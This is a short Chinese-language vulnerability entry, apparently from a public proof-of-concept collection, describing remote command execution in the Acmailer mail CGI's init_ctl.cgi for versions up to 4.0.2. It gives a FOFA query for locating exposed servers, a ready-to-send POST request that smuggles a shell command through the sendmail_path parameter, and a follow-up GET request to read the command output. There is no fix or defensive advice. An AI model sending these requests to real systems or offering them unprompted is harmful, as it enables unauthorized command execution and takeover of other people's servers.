# Acmailer邮件系统init_ctl存在远程命令执行漏洞

# 一、漏洞简介
Acmailer 是一款用于支持邮件服务的CGI软件。Acmailer邮件系统 init_ctl.cgi接口处远程命令执行,攻击者可通过此漏洞获取服务器权限。

# 二、影响版本
+ Version≤Acmailer 4.0.2

# 三、资产测绘
+ fofa`body="CGI acmailer"`
+ 特征


# 四、漏洞复现
```plain
POST /init_ctl.cgi HTTP/1.1
Host: 
User-Agent: Mozilla/5.0
Connection: close
Content-Length: 150
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

admin_name=u&admin_email=m@m.m&login_id=l&login_pass=l&sendmail_path=|id > 13619.txt | bash&homeurl=http://&mypath=e
```


获取命令执行结果

```plain
GET /13619.txt HTTP/1.1
Host: 
User-Agent: Mozilla/5.0
Connection: close
Cookie: sid=a6d9c99e3ae98d10ee34acc24af3f536
Accept-Encoding: gzip, deflate
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wanndz3h73av7n0s>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
